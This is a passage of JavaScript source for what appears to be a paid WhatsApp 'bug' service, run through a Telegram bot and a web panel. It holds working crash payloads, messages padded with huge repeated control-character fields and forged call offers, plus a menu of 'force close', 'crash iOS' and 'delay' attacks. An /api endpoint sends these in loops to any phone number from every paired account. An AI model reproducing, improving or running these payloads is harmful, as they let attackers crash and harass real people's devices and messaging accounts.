    if (targetRole === 'admin' || targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isReseller(deleterId)) {
    return targetRole === 'user';
  }  
  return false;
}

bot.onText(/\/listuser/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  
  const users = readUsers();
  const userStatus = getUserStatus(userId);
  
  let filteredUsers = users;
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'user');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'user' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  const buttons = filteredUsers.map(u => {
    return [{ text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }];
  });

  bot.sendMessage(chatId, `📂 *User List:* (${filteredUsers.length} users)`, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only owner/developer can use this command!");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");
  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    bot.sendMessage(chatId, error.message);
  }
});

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});
const crypto = require("crypto");
async function invisibleSpam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
async function rpnm(sock, target) {
  await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "7eppeli.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
          title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/YuukeyD7eppeli",
         mediaUrl: "https://t.me/YuukeyD7eppeli",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        }
      }
    }
  }, {
   participant: { jid: target }
 });
}
async function docIos(sock, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileLength: 999999999,
      pageCount: 999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      fileName: "x" + "𑇂𑆵𑆴𑆿".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1715880173
    }
  }), { quoted: quotedios });
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
}
async function PlainCall(sock, number) {
    try {
      const jid = String(number).includes("@s.whatsapp.net")
            ? String(number)
            : `${String(number).replace(/\D/g, "")}@s.whatsapp.net`;

        const mutexMemek = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async (prev) => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const MamakLoJing = mutexMemek();
        const xrellyBuffer = (buf) =>
            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeSignedDeviceIdentity;

        sock.createParticipantNodes = async (
            recipientJids,
            message,
            extraAttrs,
            dsmMessage
        ) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched =
                (await sock.patchMessageBeforeSending?.(
                    message,
                    recipientJids
                )) ?? message;

            const ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map((j) => ({
                      recipientJid: j,
                      message: patched
                  }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const jembut = meLid ? jidDecode(meLid)?.user : null;

            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: j, message: msg }) => {
                    const { user: numberUser } = jidDecode(j);
                    const { user: ownUser } = jidDecode(meId);

                    const isOwn =
                        numberUser === ownUser || numberUser === jembut;

                    const y = j === meId || j === meLid;
                    if (dsmMessage && isOwn && !y) msg = dsmMessage;

                    const bytes = xrellyBuffer(
                        yntkts ? yntkts(msg) : Buffer.from([])
                    );

                    return MamakLoJing.mutex(j, async () => {
                        const { type, ciphertext } =
                            await sock.signalRepository.encryptMessage({
                                jid: j,
                                data: bytes
                            });

                        if (type === "pkmsg")
                            shouldIncludeDeviceIdentity = true;

                        return {
                            tag: "to",
                            attrs: { jid: j },
                            content: [
                                {
                                    tag: "enc",
                                    attrs: { v: "2", type, ...extraAttrs },
                                    content: ciphertext
                                }
                            ]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let devices = [];

        try {
            devices = (
                await sock.getUSyncDevices([jid], false, false)
            ).map(
                ({ user, device }) =>
                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
            );
        } catch {
            devices = [jid];
        }

        try {
            await sock.assertSessions(devices);
        } catch {}

        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
            nodes: [],
            shouldIncludeDeviceIdentity: false
        };

        try {
            const created = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch {
            destinations = [];
            shouldIncludeDeviceIdentity = false;
        }

        const wtfXrL = {
            tag: "call",
            attrs: {
                to: jid,
                id:
                    sock.generateMessageTag?.() ??
                    crypto.randomBytes(8).toString("hex"),
                from:
                    sock.user?.id || sock.authState?.creds?.me?.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto
                            .randomBytes(16)
                            .toString("hex")
                            .slice(0, 64)
                            .toUpperCase(),
                        "call-creator":
                            sock.user?.id || sock.authState?.creds?.me?.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([
                                1, 5, 247, 9, 228, 250, 1
                            ])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        {
                            tag: "destination",
                            attrs: {},
                            content: destinations
                        }
                    ]
                }
            ]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                );

                wtfXrL.content[0].content.push({
                    tag: "device-identity",
                    attrs: {},
                    content: deviceIdentity
                });
            } catch (e) {}
        }

        await sock.sendNode(wtfXrL);

    } catch (e) {}
}
async function blankIos(sock, target) {
  await sock.sendMessage(
    target,
    {
      text: "*X PARADOX*",
      contentText: "X PARADOX",
      footer: "X PARADOX",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "᬴".repeat(60000),
              sections: []
            })
          }
        }
      ],
      headerType: 1
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
const listbug = [
  { 'name': 'FORCE CLOSE INFINITY', 'id': 'fc' },
  { 'name': 'FORCE CLOSE CALL', 'id': 'call' },
  { 'name': 'CRASH IOS', 'id': 'ios' },
  { 'name': 'DELAY HARD INVISIBLE', 'id': 'delay' },
  { 'name': 'BLANK CLICK IOS & ANDRO', 'id': 'blank' },
  { 'name': 'CLEAR FORCE INFINITY', 'id': 'clear' }
];
app.get('/listbug', (req, res) => {
  res.json({ bugs: listbug });
});
app.get('/senders', (req, res) => {
  const { username } = req.query;
  
  if (!username) {
    return res.status(400).json({ error: 'Username parameter required' });
  }
  
  const userSenders = getUserSenders(username);
  const sendersWithStatus = userSenders.map(botNumber => {
    const connected = sessions.has(botNumber);
    const connecting = pairingCodes.has(botNumber) && !connected;    
    return {
      id: botNumber,
      botNumber: botNumber,
      status: connected ? 'Connected' : connecting ? 'Connecting' : 'Disconnected',
      connected: connected,
      connecting: connecting
    };
  });
  
  res.json({ 
    username: username,
    senders: sendersWithStatus,
    total: sendersWithStatus.length
  });
});

app.delete('/sender/:id', (req, res) => {
  const { id } = req.params;
  const { username } = req.query;
  
  if (!username) {
    return res.status(400).json({ error: 'Username parameter required' });
  }
  
  try {
    if (sessions.has(id)) {
      const sock = sessions.get(id);
      sock.logout();
      sessions.delete(id);
    }    
    pairingCodes.delete(id);
    const success = removeUserSender(username, id);
    
    if (success) {
      res.json({ 
        message: 'Sender deleted successfully',
        senderId: id,
        username: username
      });
    } else {
      res.status(500).json({ error: 'Failed to delete sender from database' });
    }
  } catch (error) {
    console.error('Error deleting sender:', error);
    res.status(500).json({ error: 'Failed to delete sender' });
  }
});

app.get('/users', (req, res) => {
  const users = getAllUsers();
  
  const usersWithStats = users.map(user => {
    const userSenders = getUserSenders(user.username);
    const activeSenders = userSenders.filter(num => sessions.has(num));
    
    return {
      username: user.username,
      role: user.role,
      status: user.status,
      expired: user.expired,
      created: user.created,
      totalSenders: userSenders.length,
      activeSenders: activeSenders.length
    };
  });
  
  res.json({ 
    users: usersWithStats,
    total: usersWithStats.length
  });
});

app.delete('/user/:username', (req, res) => {
  const { username } = req.params;
  
  try {
    const users = readUsers();
    const userExists = users.find(u => u.username === username);
    
    if (!userExists) {
      return res.status(404).json({ error: 'User not found' });
    }
    const userSenders = getUserSenders(username);
    userSenders.forEach(botNumber => {
      if (sessions.has(botNumber)) {
        const sock = sessions.get(botNumber);
        sock.logout();
        sessions.delete(botNumber);
      }
      pairingCodes.delete(botNumber);
    });
    const senders = readSenders();
    delete senders[username];
    writeSenders(senders);
    const updatedUsers = users.filter(u => u.username !== username);
    const success = writeUsers(updatedUsers);
    
    if (success) {
      res.json({ 
        message: 'User deleted successfully',
        username: username,
        deletedSenders: userSenders.length
      });
    } else {
      res.status(500).json({ error: 'Failed to delete user from database' });
    }
  } catch (error) {
    console.error('Error deleting user:', error);
    res.status(500).json({ error: 'Failed to delete user' });
  }
});

app.get('/allsenders', (req, res) => {
  const allSenders = getAllSenders();
  const sendersWithDetails = {};
  
  Object.keys(allSenders).forEach(username => {
    sendersWithDetails[username] = allSenders[username].map(botNumber => {
      const connected = sessions.has(botNumber);
      const connecting = pairingCodes.has(botNumber) && !connected;
      
      return {
        botNumber: botNumber,
        status: connected ? 'Connected' : connecting ? 'Connecting' : 'Disconnected',
        connected: connected,
        connecting: connecting
      };
    });
  });
  
  res.json({ 
    senders: sendersWithDetails,
    totalUsers: Object.keys(sendersWithDetails).length,
    totalSessions: Object.values(sendersWithDetails).flat().length
  });
});

app.get('/status', (req, res) => {
  const totalSessions = sessions.size;
  const totalPairingCodes = pairingCodes.size;
  const totalUsers = readUsers().length;
  const allSenders = getAllSenders();
  const totalSenders = Object.values(allSenders).flat().length;
  
  res.json({
    server: 'Running',
    port: PORT,
    whatsapp: {
      connectedSessions: totalSessions,
      pairingCodes: totalPairingCodes,
      totalSenders: totalSenders
    },
    users: {
      total: totalUsers,
      active: readUsers().filter(u => u.status === 'active').length
    },
    admins: loadAdmins(),
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

app.get('/api', async (req, res) => {
  const { target, type, username } = req.query;
  
  if (!target || !type || !username) {
    return res.status(400).json({ 
      error: 'Missing parameters: target, type, or username' 
    });
  }
  const userSenders = getUserSenders(username);
  const activeSenders = userSenders.filter(num => sessions.has(num));  
  if (activeSenders.length === 0) {
    return res.json({ 
      status: false, 
      sender: 'x',
      message: 'not sender!', 
      target: target,
      tsender: activeSenders.length || "-"
    });
  }
    
  try {
    res.json({ 
      status: true, 
      sender: "all",
      message: 'bug sent successfully to all senders!', 
      target: target,
      tsender: activeSenders.join(',') 
    });
    const targetJid = target + "@s.whatsapp.net";
    for (const activeSenderNumber of activeSenders) {
      const sock = sessions.get(activeSenderNumber);    
      if (!sock) continue;
      async function delay() {
        for (let i = 0; i < 100; i++) {
          await invisibleSpam(sock, targetJid)
          await sleep(15000)
          console.log(chalk.red(target + " send delay 100/" + `${i + 1}` + " by sender " + activeSenderNumber))
        }
      }
      async function force() {
        for (let i = 0; i < 1; i++) {
          await sock.relayMessage(targetJid, {
            requestPaymentMessage: {
              currencyCodeIso4217: 'IDR',
              requestFrom: targetJid, 
              expiryTimestamp: null
            }
          }, 
          { participant: { jid: targetJid } })
          console.log(chalk.red(target + " send force by sender " + activeSenderNumber))
        }
      }
      async function call() {
        for (let i = 0; i < 50; i++) {
          await PlainCall(sock, targetJid);
          await sleep(5000)
        }
      }
      async function ios() {
        for (let i = 0; i < 20; i++) {
          await docIos(sock, targetJid)
          await rpnm(sock, targetJid)
          await sleep(15000)
          console.log(chalk.red(target + " send delay 10/" + `${i + 1}` + " by sender " + activeSenderNumber))
        }
      }
      async function blank() {
        for (let i = 0; i < 5; i++) {
          await blankIos(sock, targetJid)
        }
      }
      if (type === "fc") {
        await force();
      } else if (type === "delay") {
        await delay();
      } else if (type === "ios") {
        await ios();
      } else if (type === "clear") {
        await sock.sendMessage(targetJid, { text: "\0\n".repeat(100) });
      } else if (type === "call") {
        await call();
      } else if (type === "blank") {
        await blank();
      }
      console.log(`Successfully sent ${type} bug to ${target} using sender ${activeSenderNumber} for user ${username}`);
    }
  } catch (error) {
    console.error('Error sending message:', error);
    res.status(500).json({ 
      message: 'Failed to send message', 
      details: error.toString() 
    });
  }
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const users = readUsers();
  const user = users.find(u => u.username === username && u.password === password);
  if (user) {
    const currentDate = new Date();
    const expiredDate = new Date(user.expired);
    const userSenders = getUserSenders(username);
    const senderstotal = userSenders.map(botNumber => ({ botNumber }));
    if (currentDate > expiredDate) {
      return res.json({
        username: user.username, 
        role: user.role,
        status: true,
        expired: user.expired,
        sender: senderstotal.length || 0
      });
    }
    res.json({ 
      username: user.username, 
      role: user.role, 
      status: false, 
      expired: user.expired,
      sender: senderstotal.length || 0,
      date: Date.now()
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/addsender', (req, res) => {
  const { botNumber, username } = req.body;  
  if (!botNumber || !/^\d+$/.test(botNumber)) {
    return res.status(400).json({ error: 'Invalid bot number' });
  }  
  if (!username) {
    return res.status(400).json({ error: 'Username is required' });
  }  
  if (sessions.has(botNumber)) {
    return res.status(400).json({ error: 'Bot already connected' });
  }
  connectToWhatsAppWeb(username, botNumber).then(() => {
    setTimeout(() => {
      const pairingCode = pairingCodes.get(botNumber);
      res.json({ 
        message: 'Bot added successfully', 
        pairingCode: pairingCode,
        username: username
      });
    }, 5000);
  }).catch(error => {
    console.error('Error adding sender:', error);
    res.status(500).json({ error: 'Failed to add bot' });
  });
});

app.get('/check-session', (req, res) => {
  const { botNumber } = req.query;
  if (!botNumber) return res.status(400).json({ error: 'Bot number required' });
  const connected = sessions.has(botNumber);
  const connecting = pairingCodes.has(botNumber) && !connected;
  res.json({ connected, connecting, hasPairingCode: pairingCodes.has(botNumber) });
});

app.post('/adduser', (req, res) => {
  const { username, password, role, expiry } = req.body;
  const users = readUsers();
  if (users.find(u => u.username === username)) return res.status(400).json({ error: 'User already exists' });

  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + parseInt(expiry));
  const newUser = {
    username,
    password,
    role: role || 'user',
    status: 'active',
    created: new Date().toISOString(),
    expired: expiryDate.toISOString().split('T')[0]
  };
  users.push(newUser);

  if (writeUsers(users)) {
    res.json({ message: 'User added successfully' });
  } else res.status(500).json({ error: 'Failed to add user' });
});


app.post('/chat/send', (req, res) => {
  const { userId, username, role, message } = req.body;
  
  const data = readMessages();
  
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message,
    voiceUrl: null,
    imageUrl: null,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  
  data.messages.push(newMessage);
  writeMessages(data);
  
  res.json({ success: true, message: newMessage });
});

app.post('/chat/upload-voice', upload.single('voice'), (req, res) => {
  const { userId, username, role } = req.body;
  const voiceUrl = `${req.protocol}://${req.get('host')}/uploads/voices/${req.file.filename}`;  
  const data = readMessages();  
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message: null,
    voiceUrl,
    imageUrl: null,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  
  data.messages.push(newMessage);
  writeMessages(data);  
  res.json({ success: true, message: newMessage });
});

app.post('/chat/upload-image', upload.single('image'), (req, res) => {
  const { userId, username, role } = req.body;
  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/images/${req.file.filename}`;
  const data = readMessages(); 
  const newMessage = {
    id: `msg_${getNextId()}`,
    userId,
    username,
    role,
    message: null,
    voiceUrl: null,
    imageUrl,
    timestamp: new Date().toISOString(),
    avatarUrl: 'assets/logo.jpg',
    isDeleted: false
  };
  
  data.messages.push(newMessage);
  writeMessages(data);
  res.json({ success: true, message: newMessage });
});

app.get('/chat/messages', (req, res) => {
  const data = readMessages();
  const filteredMessages = data.messages.filter(msg => !msg.isDeleted);
  res.json(filteredMessages);
});

app.delete('/chat/delete/:id', (req, res) => {
  const messageId = req.params.id;
  const data = readMessages();
  const messageIndex = data.messages.findIndex(msg => msg.id === messageId);
  
  if (messageIndex !== -1) {
    data.messages[messageIndex].isDeleted = true;
    writeMessages(data);
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false, error: 'Message not found' });
  }
});

async function startBot() {
  await initializeWhatsAppConnections();
  app.listen(PORT);
}

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});

startBot();
const botUsersFile = './botUsers.json';
function readBotUsers() {
  try {
    if (!fs.existsSync(botUsersFile)) {
      return [];
    }
    const data = fs.readFileSync(botUsersFile, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading bot users:', error);
    return [];
  }
}
function writeBotUsers(users) {
  try {
    fs.writeFileSync(botUsersFile, JSON.stringify(users, null, 2));
    return true;
  } catch (error) {
    console.error('Error writing bot users:', error);
    return false;
  }
}
bot.onText(/\/createacc/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const botUsers = readBotUsers();
  const existingUser = botUsers.find(u => u.telegramId === userId);
  
  if (existingUser) {
    return bot.sendMessage(chatId, "❌ You can only create one account per lifetime!");
  }
  
  const group = -1003841841460;
  const group1 = -1003841841460;
  const gb2 = -1003841841460;
  try {
    const member1 = await bot.getChatMember(group, userId);
    const member2 = await bot.getChatMember(group1, userId);
    const member3 = await bot.getChatMember(gb2, userId);
    const isSubscribed1 = member1.status === 'member' || member1.status === 'administrator' || member1.status === 'creator';
    const isSubscribed2 = member2.status === 'member' || member2.status === 'administrator' || member2.status === 'creator';
    const isSubscribed3 = member3.status === 'member' || member2.status === 'administrator' || member2.status === 'creator';
    if (!isSubscribed1 || !isSubscribed2 || !isSubscribed3) {
      return bot.sendMessage(chatId,
        `⚠️ *Please subscribe to these channels first:*\n` +
        `1. ${channel1}\n` +
        `2. ${channel2}\n3. ${ch3}\n` +
        `After subscribing, use /createacc again.`,
        { parse_mode: "Markdown" }
      );
    }
  } catch (error) {
    return bot.sendMessage(chatId, error.message);
  }
  
  const telegramUsername = msg.from.username || `user${userId}`;
  const cleanUsername = telegramUsername.replace(/[^a-zA-Z0-9]/g, '');
  
  if (!cleanUsername) {
    return bot.sendMessage(chatId, "❌ Invalid Telegram username. Please set a username with letters/numbers first.");
  }
  
  let finalUsername = cleanUsername;
  const panelUsers = readUsers();
  
  let counter = 1;
  while (panelUsers.find(u => u.username === finalUsername)) {
    finalUsername = `${cleanUsername}${counter}`;
    counter++;
  }
  
  const password = finalUsername + Math.floor(Math.random() * 1000);
  const expiryDays = 30;
  
  const allowedRole = 'user';
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + expiryDays);
  
  panelUsers.push({
    username: finalUsername,
    password: password,
    role: 'user',
    status: "Active",
    expired: expiryDate.toISOString().split('T')[0],
    created: new Date().toISOString(),
  });

  botUsers.push({
    telegramId: userId,
    telegramUsername: msg.from.username || 'no_username',
    createdPanelUsername: finalUsername,
    createdAt: new Date().toISOString(),
    chatId: chatId
  });
  
  const panelSuccess = writeUsers(panelUsers);
  const botSuccess = writeBotUsers(botUsers);
  
  if (panelSuccess && botSuccess) {
    bot.sendMessage(chatId, `*Account created successfully!*\n` +
      `Username: \`${finalUsername}\`\n` +
      `Password: \`${password}\`\n` +
      `Role: ${allowedRole}\n` +
      `Expired: ${expiryDate.toISOString().split('T')[0]}\n` +
      `Days: ${expiryDays}\nDownload Apk: http://files.catbox.moe/cmx082.apk\n` +
      `⚠️ *Important:*\n` +
      `• Save your credentials!\n` +
      `• You cannot create another account!`, {
      parse_mode: "Markdown" });
    
    
    bot.sendMessage(DEVELOPER_IDS[0],
      `📋 New account created via Telegram Bot\n\n` +
      `👤 User: @${msg.from.username || 'N/A'} (${userId})\n` +
      `📱 Panel Username: ${finalUsername}\n` +
      `📅 Expiry: ${expiryDays} days\n` +
      `🕐 Created: ${new Date().toLocaleString()}`
    );
  } else {
    bot.sendMessage(chatId, "❌ Failed to create account. Please try again later.");
  }
});
const Mreact = ["🥶", "🥺", "😎", "🗿", "🙄", "😱", "😭", "😡"];
bot.on('channel_post', async msg => {
  try {
    const emoji = Mreact[Math.floor(Math.random() * Mreact.length)];
    await bot.sendReact(msg.chat.id, msg.message_id, emoji);
  } catch {}
});
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});
process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};
setInterval(() => {
  console.log("♻️ Auto restarting panel...");
  process.exit(0);
}, 20 * 60 * 1000);
